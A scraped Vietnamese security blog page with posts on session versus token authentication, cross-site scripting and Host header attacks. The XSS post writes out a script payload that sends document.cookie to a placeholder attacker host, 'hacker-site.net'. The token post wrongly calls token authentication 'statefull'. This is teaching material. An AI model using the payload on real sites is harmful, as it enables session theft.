<ul><li><a href="https://auth0.com/docs/getting-started" target="_blank" rel="noopener">https://auth0.com/docs/getting-started</a></li><li><a href="https://tools.ietf.org/html/rfc6749" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc6749</a> ***</li><li><a href="https://alexbilbie.com/guide-to-oauth-2-grants/#which-oauth-20-grant-should-i-use" target="_blank" rel="noopener">https://alexbilbie.com/guide-to-oauth-2-grants/#which-oauth-20-grant-should-i-use</a></li><li><a href="https://curity.io/resources/develop/oauth/oauth-code-flow/" target="_blank" rel="noopener">https://curity.io/resources/develop/oauth/oauth-code-flow/</a></li></ul>
<!-- /wp:list -->

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/14/oath/" data-id="ckbgpmbd0000vqxjm1stnf4bt" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Session vs Token-Based Authentication" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/Session%20vs%20Token-Based%20Authentication/" class="article-date">
  <time datetime="2020-06-14T07:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/Session%20vs%20Token-Based%20Authentication/">Session &amp; Token-Based Authentication</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- wp:paragraph -->
<p>Xin chào các bạn, bài viết này mĩnh sẽ nói về 2 cơ chế xác thực người dùng dựa vào session và token. Chắc nhiều bạn thấy chúng rât nhiều nhưng cũng chưa rõ nó hoạt động như thế nào .Ok chúng ta cùng tìm hiểu nào.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Tại sao lại dùng session hay token để xác thực người dùng ?</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Như các bạn đã biết việc giao tiếp giữa trình duyệt web (user) với  với máy chủ sẽ sử dụng giao thức truyền siêu văn bản  HTTP (Hypertext Transfer Protocol) . Mà HTTP là một giao thức phi trạng thái (Stateless) - phiên kết nối (TCP session) sẽ mất khi gói tin đến đích . Điều đó đồng nghĩa với việc mỗi lần user request đến tài nguyên cần xác thực họ sẽ phải đăng nhập một lần. Oh Bully sh!t ! Vì vậy người ta cần tìm cách để có thể xác thực và duy trì trạng thái đăng nhập cho người dùng và đó là lí do  dùng đến session và token. Thực ra ngoài hai phương thức này còn một phương thức cổ điển nữa mà thỉnh thoảng ta vẫn hay gặp đó là HTTP basic authentication nhưng nó rất đơn giản, thô và thường chỉ sử dụng trong nội bộ nên mình sẽ bỏ qua. Ok tiếp tục nào !</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Session based Authentication</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Trong bài viết trước của mình có giải thích về session , bạn nào chưa biết có thể tham khảo. Session sẽ được tạo ra khi user request đến server và server sẽ gửi sessionid về browser và lưu trữ ở cache browser. Các request tiếp theo từ browser lên server thì sessionid được đính kèm dưới dạng cookie . Server sẽ thực hiện so sánh giá trị sessionid và trả response về.</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://images.viblo.asia/full/fdd3546f-1ee6-4ea7-afa4-d07189532c30.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3><strong>Ưu điểm:</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>Thông tin được giấu kín, an toàn:</strong>&nbsp;Client chỉ được biết tới&nbsp;<strong>Session ID</strong>&nbsp;thường là 1 chuỗi random hoặc đã được băm không có thông tin gì của người dùng, còn mọi thông tin khác của phiên đăng nhập hay người dùng hiện tại đều được lưu phía server nên cơ chế này giữ kín được thông tin của người dùng trong quá trình truyền tải.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Fully-controlled session:</strong>&nbsp;Tính chất này có thể cho phép hệ thống quản trị được&nbsp;<strong>TẤT CẢ</strong>&nbsp;các hoạt động liên quan tới phiên đăng nhập của người dùng như thời gian login, force logout,...</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Nhược điểm</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>Chiếm nhiều bộ nhớ:</strong>&nbsp;Với mỗi phiên làm việc của user, server sẽ lại phải tạo ra một session và lưu vào bộ nhớ trên server. Số data này có thể còn lớn hơn cả user database của bạn do mỗi user có thể có vài session khác nhau. Do vậy việc tra cứu đối với các hệ thống lớn nhiều người dùng sẽ là vấn đề.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Khả năng bị  tấn công CSRF:</strong>&nbsp;Nói nôm na là do&nbsp;Session ID&nbsp;thường được lưu vào&nbsp;cookie mà  cookie được&nbsp;tự động&nbsp;gắn vào các request tới domain của bạn.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Không có khả năng mở rộng (Scalability)  với các flatform khác:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Bây giờ hãy thử tưởng tượng chúng ta đang có một trang web hoạt động ngon lành với Session rồi, nhưng tới một ngày chúng ta phải làm thêm các Native Apps (ứng dụng di động) cho hệ thống là IOS hoặc Android, và cùng sử dụng chung một Database với ứng dụng web hiện tại thì như thế nào?</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Rõ ràng lúc này chúng ta sẽ không thể xác thực người dùng sử dụng Native app bằng Session được vì Native app không có Cookie, chỉ Browser mới có mà thôi.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Vậy nên Token-Based Authentication - JWT mới được sinh ra trên thế giới lập trình này để giải quyết vấn đề trên và hiện nay nó luôn được ưu tiên lựa chọn mỗi khi bắt đầu làm một dự án mới.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p> Mặc dù vậy, hiện tại Session-based Authentication thường được dùng trong các website thương mại ,nhỏ vừa (tham khảo phần mục đích của session trong bài viết của mình) và những ứng dụng web làm việc chủ yếu với browser, những hệ thống monolithic do cần sự tập trung trong việc lưu session data và sự hạn chế về domain.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Token-Based Authentication</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Token-Based Authentication đã ra mắt cũng  được vài năm, nó đề xuất bởi OAuth 2.0 Framework. Cách thức hoạt động của kĩ thuật này khá giống với với Session-Based Authentication nhưng các công nghệ ngày nay vẫn ưu tiên sử dụng nó hơn, tại sao nhỉ?</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Điều đầu tiên cần nhớ, Token-Based Authentication là statefull (khác với session ) vì vậy server sẽ không lưu trữ hồ sơ về việc người dùng đã đăng nhập hay token đã được tạo. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Dựa vào định dạng sẽ có 3 loại token chính là SAML ( Security Markup  Assertion Language), SWT ( Simple Web Token) và JWT (Json Web Token). Chi tiết về các loại này mình sẽ có bài viết riêng và trong bài này mĩnh sẽ lấy JWT để nói vì nó được chấp nhận và sử dụng rộng rãi như một tiêu chuẩn của các nền tảng web hiện đại (<a href="https://tools.ietf.org/html/rfc7519" target="_blank" rel="noopener">RFC 7519</a>) . </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Nói qua một chút về JWT  để các bạn có hiểu rõ hơn về quy trình xác thực của nó (Chi tiết sẽ có bài viết riêng). JWT token định nghĩa là cách thức xác thực giữa các ứng dụng bằng một đối tượng&nbsp;JSON<strong>,</strong>nó bao gồm 3 phần lầ header, payload và chữ ký (signature). JWT sử dụng chữ kí số để đảm bảo tính toàn vẹn của token được tạo, phần payload sẽ chứa các thông tin của người dùng để xác thực , còn header để chỉ định thuật toán để mã hóa.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p> Dưới đây là Flow của Token-based Authentication:</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://images.viblo.asia/17eeed29-52cf-4b4c-92b4-17c9adeb249a.png" alt="Session và Token Based Authentication - Viblo"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Đầu tiên user submit username/password , sau khi check thông tin hợp lệ server sẽ tạo token và trả lại token trong response cho người dùng. Phía client sẽ thực hiện lưu trữ, nếu như là trình duyệt web thì JWT có thể lưu vào Local Storage, IOS app thì sẽ là Keychain và Android app sẽ lưu vào SharedPreferences. Các request tiếp theo token sẽ được thêm vào request ở các vị trí như là Athorization header , URL , Cookie header hoặc request body. Server sẽ check token bằng cách kiểm tra chữ kí số (signature) , đảm bảo thông tin trong token là chính xác và token đó do server tạo ra. Response sẽ  được trả về nếu thành công hoặc thông báo lỗi xác thực nếu thất bại.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":292,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/image-13.png" alt="" class="wp-image-292"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4><strong>Ưu điểm</strong>:</h4>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><li><strong><strong>Phù hợp với nhiều loại client:</strong>&nbsp;</strong>Nên nhớ, cookie là một concept được&nbsp;các browser&nbsp;áp dụng tự động, còn với các client sử dụng Web API như mobile, IoT device, server,... thì việc sử dụng cookie lại rất hạn chế. Sử dụng token trong header hay URL,... sẽ dễ dàng hơn cho client trong việc lưu lại token và truyền tải token.</li><li><strong>Scalability:</strong> Dễ dàng mở rộng server hơn. Điều này là nhờ tính stateless của JWT, server không cần phải lưu session state, nên trong trường hợp phía server sử dụng cơ chế load balancing, bất kỳ máy server nào cũng có thể handle request và vẫn có được state của user thay vì chỉ server mà user đã login.</li><li><strong>Chống CSRF:</strong>&nbsp;Thông thường thì token được thêm vào URL hoặc Authorization header và request body ( kèm trong cookie rất ít ) nên sẽ phòng chống được các trường hợp tấn công như với trường hợp session/cookie. Ngoài ra ,theo như RFC thì token cũng có nhiều loại trong đó có lại chỉ sử dụng một lần hoặc chỉ dùng cho một hành động.</li></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":4} -->
<h4>Nhược điểm:</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>Phức tạp cho phía client</strong>: Cơ chế sử dụng token thường yêu cầu client phải có xử lý liên quan tới lưu token, gửi token, do vậy sẽ không phù hợp với những website kiểu cũ, sử dụng nhiều server render html và phần javascript hạn chế.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Thông tin dễ lộ:</strong> JWT&nbsp;nó&nbsp;không ẩn, không làm mờ, không che giấu dữ liệu gì cả, mà nó được sử dụng để&nbsp;chứng minh rằng dữ liệu được tạo ra bởi một nguồn xác thực. Dữ liệu trong payload chỉ được Encoded bằng base64urlencode chứ không phải Encrypted. Chính vì vậy, thông thường người ta chỉ lưu 1 số thông tin thiết yếu như user_id, username mà không lưu những thông tin nhạy cảm như password vào token vgiao thức mã hóa đường truyền HTTPS để tránh tấn công MITM .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Ok minh đã trình bày tổng quát về 2 các xác thực dựa vào session và token. Các bạn muốm tìm hiểu sâu hơn có thể tham khảo link mình đã đểm bên dưới. Cảm ơn các bạn đã đọc bài !</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Tham khảo</h2>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><li><a href="https://kipalog.com/posts/Authentication-story-part-2--Authentication-co-ban" target="_blank" rel="noopener">https://kipalog.com/posts/Authentication-story-part-2--Authentication-co-ban</a></li><li><a href="https://wp-rocket.me/blog/difference-json-web-tokens-vs-session-cookies/" target="_blank" rel="noopener">https://wp-rocket.me/blog/difference-json-web-tokens-vs-session-cookies/</a></li><li><a href="https://trungquandev.com/hieu-sau-ve-jwt-json-web-tokens/" target="_blank" rel="noopener">https://trungquandev.com/hieu-sau-ve-jwt-json-web-tokens/</a></li><li>Token-Based vs Session-Based Authentication: A survey</li><li>Pro ASP.NET Web API Security Securing ASP.NET Web API by by Badrinarayanan Lakshmiraghavan</li></ul>
<!-- /wp:list -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/14/Session%20vs%20Token-Based%20Authentication/" data-id="ckbgpmbco000fqxjm50du0zxs" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Cross Site Scripting (Part1)" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/Cross%20Site%20Scripting%20(Part1)/" class="article-date">
  <time datetime="2020-06-14T07:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/Cross%20Site%20Scripting%20(Part1)/">Cross Site Scripting (Part 1)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- wp:heading {"level":4} -->
<h4>Cross Site Scripting là gì ? Có những kiểu nào ?</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Cross Site Scripting (XSS) là một trong những kiểu tấn công hay là lỗ hổng phổ biến hiện nay đổi với web application .Nó không gọi tắt là CSS để tránh nhầm lẫn với khái niệm Cascading Style Sheet của HTML.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Kỹ thuật&nbsp;XSS&nbsp;được thực hiện dựa trên việc chèn các đoạn script độc hại vào trong source code ứng dụng web. Nhằm thực thi các đoạn mã độc Javascript để chiếm phiên làm việc (session) của người dùng. Từ đó cho phép kẻ tấn công giả danh thành người dùng , thực hiện bất kỳ chức năng nào mà người dùng có thể thực hiện và truy cập vào bất kỳ dữ liệu nào của người dùng mà không cần phải đăng nhập bằng tài khoản của nạn nhân. Nếu người dùng có quyền truy cập đặc quyền trong ứng dụng thì kẻ tấn công cũng có thể có toàn quyền kiểm soát tất cả các chức năng và dữ liệu của ứng dụng đó.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Một điều lưu ý bạn hiểu là tấn công XSS được thực hiện ở phía client không làm ảnh hưởng đến hệ thống trên server . Nó có thể được thực hiện với các ngôn ngữ lập trình phía client khác nhau. Tuy nhiên, thường xuyên nhất cuộc tấn công này được thực hiện với Javascript và HTML. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>XSS có 3 kiểu nhưng đều có cách thức tấn công chung là kẻ tấn công sẽ cố gắng gửi cho nạn nhân link có chứa script độc hại hoặc nội dung có chứa script độc hại nhằm lừa người dùng thực thi nó . Sau khi thực thi thì session của người dùng sẽ được gửi đến hacker . Hacker đã có quyền truy cập, thay đổi thông tin tài khoản mà nạn nhân không hề hay biết.  </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Đây là một ví dụ kẻ tấn công chèn script qua giá trị đầu vào (input param) thông qua URL :</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://dtsa.eu/wp-content/uploads/2017/06/wp_custom_fields_serach_poc-1024x375.png" alt=""/><figcaption>Ví dụ XSS</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Đây là cách thức đơn giản của việc kiểm thử lỗ hổng này, do mức độ bảo mật của các website ngày càng được nâng cao nên các biến thể của cách tấn công cũng đa dạng theo (Cụ thể như thế nào ở phần tiếp theo). Điều tiếp theo chúng ta  cần nhớ Cross Site Scripting (XSS) có 3 loại  chính là :</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>Reflected XSS</li><li>Stored XSS</li><li>DOM based XSS (Biến thể của Reflected)</li></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":4} -->
<h4>Reflected XSS</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Trong 3 loại thì Reflected XSS là loại tấn công phổ biến nhất. Cách thức tấn công chủ yếu là gửi link có chứa script độc hại như sau:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph {"customFontSize":15.5} -->
<p style="font-size:15.5px">http://example.com/<a href="https://ac541f041e348399802625d4008000fe.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" target="_blank" rel="noopener">name=&lt;script&gt;var i=new Image; i.src=”http://hacker-site.net/”+document.cookie;&lt;/script&gt;</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Khi người dùng click vào đường link , request sẽ được gửi lên server, sessionid được trả về phía client và script có trong thành phần (Element)  của website lúc này  và trình duyệt (Browser) sẽ thực thi script đó.Lúc này người dùng đang có phiên làm việc với ứng dụng (example.com), đoạn script sẽ gửi đến server của hacker (hacker-site.net) với giá trị  "document.cookie" - Sessionid. Dưới đây là hình ảnh minh họa các bước tấn công :</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://2.bp.blogspot.com/-Up9Gu_xOnLI/VSX6aqmSz0I/AAAAAAAAHWY/dIQi3ZY5JE4/s1600/3-17-2014-5-51-21-PM-700x398.jpg" alt=""/><figcaption>Các bước thực hiện tấn công Reflected XSS</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p> Một bài lab trên portswigger.net về reflected XSS:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":68,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/03/image-1024x384.png" alt="" class="wp-image-68"/><figcaption>Reflected Xss Lab on Portswigger</figcaption></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p>Trong hình trên, ta chèn script độc hại thông qua biến "search" và đoạn script vẫn nằm trong cặp tag "h1".</p></blockquote>
<!-- /wp:quote -->

<!-- wp:heading {"level":4} -->
<h4>DOM Based XSS</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Đầu tiên ta cần biết <a rel="noreferrer noopener" href="https://viblo.asia/p/nhung-khai-niem-co-ban-ve-dom-DzVkpoDgenW" target="_blank">DOM</a> là từ viết tắt của Document Object Model là 1 dạng chuẩn của W3C đưa ra nhằm để truy xuất và thao tác dữ liệu của tài liệu có cấu trúc như HTML, XML. Để javascript làm việc được với các thẻ HTML thì cần sử dụng đến DOM. Lấy một ví dụ như này: (W3school)</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>&lt;!DOCTYPE html>
&lt;html>
&lt;body>

&lt;p>Click the button to display the URL of the document.&lt;/p>

&lt;button onclick="myFunction()">Try it&lt;/button>

&lt;p id="demo">&lt;/p>

&lt;script>
function myFunction() {
  var x = document.URL;
  document.getElementById("demo").innerHTML = x;
}
&lt;/script>

&lt;/body>
&lt;/html>
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>DOM Based XSS là kỹ thuật khai thác XSS &nbsp;dựa trên việc thao tác với dữ liệu của các DOM này, nó sử dụng dữ liệu của người dùng hay các dữ liệu ngoài như URL để thêm HTML vào trang như ví dụ trên. Về đặc điểm thì nó giống như reflected chỉ khác là payload sẽ không được sử lí bởi server mà nó sử lí bởi client , nó sẽ dựa vào DOM để có thể đưa payload vào làm giá trị của các element  trên  website. Như ví dụ trên ta sẽ sử dụng URL chứa payload nhưng vẫn được coi hợp lệ như sau "http://www.example.com/userdashboard.html#&lt;/p&gt;&lt;script&gt;SomeFunction(somevariable)&lt;/script&gt;" và kết quả sẽ là:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>&lt;p>Click the button to display the URL of the document.&lt;/p>

&lt;button onclick="myFunction()">Try it&lt;/button>

&lt;p id="demo">http://www.example.com/userdashboard.html#&lt;/p>&lt;script>SomeFunction(somevariable)&lt;/script>&lt;/p>
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p> Vì vậy lỗ hổng này sẽ khai thác khó hơn các kiểu còn lại vì nó yêu cầu kẻ tấn công có nhiều kiến thức về javascript và html.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Tấn công DOM Based XSS thông thường không qua các giá trị đầu vào mà nó qua "HTML Manipulation sinks" như: InnerHTML, outerHTML,  ...  và "Browser JavaScript execution sinks" như : eval sink, document sink , location sink ... .</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p>document.write()<br> document.writeln()<br> document.domain<br> someDOMElement.innerHTML<br> someDOMElement.outerHTML<br> someDOMElement.insertAdjacentHTML<br> someDOMElement.onevent</p><cite>The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:</cite></blockquote>
<!-- /wp:quote -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p>add()<br> after()<br> append()<br> animate()<br> insertAfter()<br> insertBefore()<br> before()<br> html()<br> prepend()<br> replaceAll()<br> replaceWith()<br> wrap()<br> wrapInner()<br> wrapAll()<br> has()<br> constructor()<br> init()<br> index()<br> jQuery.parseHTML()<br> $.parseHTML()</p><cite>The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:</cite></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p> Vì chuỗi độc hại được chèn vào trang bằng cách sử dụng innerHTML, nên nó được phân tích cú pháp dưới dạng HTML, khiến tập lệnh độc hại được thực thi.Hầu hết nguyên nhân dẫn đến lỗ hổng do người lập trình đã không kiểm soát đầu vào lỏng lẻo khi dùng các đối tượng trên  và nó cũng có thể tồn tại trong các thư viện như Jquery hay các framework: &nbsp;angular,&nbsp;react, ....  có sẵn mà người phát triển không hay biết. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Một lưu ý khi kiểm tra lỗ hổng DOM Base XSS thì không nên dùng " View page source" (Ctrl +U) để xem luồng xử lí javascript hoạt động bởi vì nó sẽ không thấy được sự thay đổi .Thay vào đó hãy sử dụng "Developer tool" (Ctrl+Shift+I) và search (Ctrl + F) để tìm kiểm. </p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>STORED XSS</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Khác với 2 loại tấn công trên, Stored XSS hướng đến nhiều nạn nhân hơn. Lỗi này xảy vẫn xảy ra khi ứng dụng web không kiểm tra kỹ các dữ liệu đầu vào nhưng giá trị lần này sẽ được lưu vào cơ sở dữ liệu (database , file hay những khu vực khác nhằm lưu trữ dữ liệu của ứng dụng web). Ví dụ như các form góp ý, các comment … trên các trang web. Với kỹ thuật Stored XSS , hacker không khai thác trực tiếp mà phải thực hiện tối thiểu qua 2 bước.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Đầu tiên hacker sẽ thông qua các điểm đầu vào (form, input, textarea…) không được kiểm tra kỹ để chèn vào CSDL các đoạn mã nguy hiểm.Tiếp theo đó người dùng truy cập vào dữ liệu có chứa script độc hại của hacker dẫn đến script được thực thi. Mức độ phát hiện bị lừa khó hơn 2 kiểu trước .</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://i0.wp.com/securitydaily.net/wp-content/uploads/2014/03/stored-xss-scenario1.png?fit=998%2C576&amp;ssl=1" alt=""/><figcaption>Stored XSS</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Ngoài 3 kiểu trên còn tồn tại một kiểu XSS được gọi là <strong>SELF-XSS</strong>.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p> Self-XSS không thể khai thác trực tiếp hay được lưu trữ lại như trong 3 cách trên mà nó yêu cầu phải kết hợp cả kĩ nghệ xã hội (Soical Engineering) - hay hiểu đơn giản là lừa chính nạn nhân thiếu hiểu biết (VD: Lừa  sẽ được thanh toàn miễn phí khi làm theo) chèn script và thực thi ở những vị trí tồn tại  XSS. Tester thường nghĩ là lỗ hổng XSS có thể tồn tại nhưng không thể khai thác được nhưng trong một số Bug Bounty Program vẫn được tính và trao thưởng.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":71,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/03/image-1.png" alt="" class="wp-image-71"/><figcaption><a href="https://hackerone.com/reports/755679" target="_blank" rel="noopener">https://hackerone.com/reports/755679</a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Phần tiếp theo XXX sẽ giới thiệu các cách khai thác lỗ hổng này. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Link tham khảo :</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li><a href="https://tech.bizflycloud.vn/tong-quan-ve-dom-based-cross-site-scripting-dom-xss-20190424103508199.htm" target="_blank" rel="noopener">https://tech.bizflycloud.vn/tong-quan-ve-dom-based-cross-site-scripting-dom-xss-20190424103508199.htm</a></li><li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener">https://portswigger.net/web-security/cross-site-scripting</a></li><li></li></ul>
<!-- /wp:list -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/14/Cross%20Site%20Scripting%20(Part1)/" data-id="ckbgpmbch0007qxjm5adsg6om" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-App/" rel="tag">Web App</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Host Header Attack" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/Host%20Header%20Attack/" class="article-date">
  <time datetime="2020-06-14T07:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/Host%20Header%20Attack/">Host Header Attack</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- wp:image {"align":"center","width":485,"height":266} -->
<div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQYlVnvXSiQcarEPtvEKnYSHVLvIvgVcvzuHwJmX4PDXY2QHco2&amp;usqp=CAU" alt="HOST HEADER INJECTION ATTACK - Ram Kumar - Medium" width="485" height="266"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Xin chào các bạn! Mình lại quay trở lại với một lỗ hổng thuộc dạng HTTP header injection . Kiểu tấn công này thì nó không quá phức tạp vì mức ảnh hưởng của nó cũng chỉ ở mức bình thường. Nhưng như vậy không có nghĩ là mình sẽ bỏ qua, đôi khi có những cái mình không ngờ lại là cái nguy hiểm nhất. Vậy Host Header Attack có gì hay? Chúng ta cùng tìm hiểu nào?</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p>A client MUST include a Host header field in all HTTP/1.1 request<br>messages</p><cite><strong>RFC 2616</strong></cite></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>Theo như trong tài liệu <strong><a href="https://tools.ietf.org/html/rfc2616#page-128" target="_blank" rel="noopener">RFC 2616</a></strong> ở mục 14.23 thì trong tất cả các message HTTP/1.1 request từ Client đén Server bắt buộc phải bao gồm trường  "Host" header .&nbsp;Nếu URI được request đến không chứa tên máy chủ Internet của dịch vụ thì trường Host header coi như có giá trị là "empty"(rỗng) .&nbsp;Bất kỳ request HTTP/1.1 nào không có trường Host header  thì sẽ được máy chủ phản hồi với mã trạng thái là 400 (bad request). Thế "Host" header để làm gì ta?</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Thông thường một máy chủ web thường phục vụ, lưu trữ nhiều website hoặc ứng dụng web và tất nhiên chúng sẽ cùng một địa chỉ IP của server. Mỗi website hay ứng dụng được lưu trữ như vậy được gọi là "Virtual host".Bây giờ làm sao cho người dùng có thể truy cập vào các website khác nhau ? Đó là lí do của HOST header tồn tại. Tiêu đề này sẽ nằm trong HTTP request đến máy chủ và máy chủ sẽ sử dụng giá trị của header này để chuyển request đến website hoặc ứng dụng được chỉ định. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Điều gì xảy ra nếu chúng ta thay đổi giá trị của header là các host không xác định (evil.com) ? Hầu hết các máy chủ web thường chuyển các các host khồng xác định trong header vào đầu của danh sách "virtual host" của nó, Vì vậy các request tới server với host header không xác định như vậy vẫn được coi là hợp lệ.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":252,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/image-9.png" alt="" class="wp-image-252"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Ngoài ra ngoài việc sử dụng "Host" header , attacker còn có thể sử dụng "X-Forward-Host" (viết tắt là XFH) để inject. XFH được sủ dụng để chỉ định máy chủ được chỉ định (X-Forward-Host: cdn.example.com) chuyển tiếp giá trị của "Host" header đến máy chủ gốc.XFH thường được áp dụng trong trương hợp sử dụng proxy hoặc các CDN, trong tài liệu của <a href="https://tools.ietf.org/html/rfc7230#section-5.4" target="_blank" rel="noreferrer noopener">RFC 7230</a>, phần 5.4 có nói:</p>
